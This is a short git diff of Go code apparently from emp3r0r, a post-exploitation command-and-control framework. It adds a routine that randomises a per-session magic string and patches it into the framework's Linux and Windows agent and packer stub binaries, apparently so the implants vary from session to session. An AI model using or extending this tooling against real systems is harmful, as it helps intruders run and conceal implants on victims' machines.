@@ -13,6 +13,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/cc"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 )
 
@@ -51,6 +52,22 @@ func unlock_downloads() bool {
 	return true
 }
 
+// re-generate a random magic string for this CC session
+func init_magic_str() {
+	default_magic_str := emp3r0r_data.OneTimeMagicBytes
+	emp3r0r_data.OneTimeMagicBytes = util.RandBytes(len(default_magic_str))
+	cc.CliPrintInfo("Magic string is %x this time", emp3r0r_data.OneTimeMagicBytes)
+
+	// update binaries
+	err := util.ReplaceBytesInFile(emp3r0r_data.Stub_Linux, []byte(default_magic_str), []byte(emp3r0r_data.OneTimeMagicBytes))
+	if err != nil {
+		cc.CliPrintError("init_magic_str %v", err)
+	}
+	util.ReplaceBytesInFile(emp3r0r_data.Stub_Windows, []byte(default_magic_str), []byte(emp3r0r_data.OneTimeMagicBytes))
+	util.ReplaceBytesInFile(emp3r0r_data.Packer_Stub_Windows, []byte(default_magic_str), []byte(emp3r0r_data.OneTimeMagicBytes))
+	util.ReplaceBytesInFile(emp3r0r_data.Packer_Stub, []byte(default_magic_str), []byte(emp3r0r_data.OneTimeMagicBytes))
+}
+
 func main() {
 	var err error
 
@@ -64,6 +81,9 @@ func main() {
 	if err != nil {
 		log.Fatal(err)
 	}
+
+	// set up magic string
+	init_magic_str()
 
 	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
 	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
